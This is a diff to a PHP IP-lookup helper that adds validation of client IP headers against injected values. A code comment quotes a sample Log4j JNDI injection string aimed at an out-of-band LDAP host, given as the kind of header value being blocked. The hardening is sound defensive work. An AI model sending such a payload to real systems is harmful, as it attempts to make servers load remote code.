@@ -89,7 +89,6 @@ if (!function_exists('hash_equals')) {
     }
 }
 
-
 /*  Returns string representation of IP. It can either IPv6 OR IPv4 format.
     Maximum length of returned value is 45 characters.
 
@@ -106,18 +105,25 @@ function get_ip() {
     }elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']) && (4 < strlen($_SERVER['HTTP_X_FORWARDED_FOR']))) {
         $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
 
-    }elseif (isset($_SERVER['REMOTE_ADDR'])) {
-        $ip = $_SERVER['REMOTE_ADDR'];
     }else {
-        $ip = false;
+        $ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : false;
     }
 
-    // If request forwarded via Proxy, there is can be multiple comma-separated addresses. And this can be in any value, even REMOTE_ADDR. Let's take only first.
-    return $ip
-        ? (false !== ($p = strpos($ip, ','))
-            ? substr($ip, 0, $p)
-            : $ip)
-        : '0.0.0.0'; // It's '0:0:0:0:0:ffff:0:0' in IPv6, but this is impossible situation, so we don't care.
+    if (!$ip) {
+        return '0.0.0.0'; // It's '0:0:0:0:0:ffff:0:0' in IPv6, but this is impossible situation, so we don't care.
+    }
+
+    $ip = false !== ($p = strpos($ip, ','))
+        ? substr($ip, 0, $p)
+        : $ip;
+
+    // Log4j JNDI Attack? IP can look like the follows: ${jndi:ldap://${:-126}${:-178}.${hostName}.xforwardedfor.cpkj12ja2d9cud2sd53084m68qyho39is.oast.me}
+    if (!filter_var($ip, FILTER_VALIDATE_IP)) {
+        http_response_code(400);
+        die('400 Bad request');
+    }
+
+    return $ip;
 }
 
 // Write to log + output as text
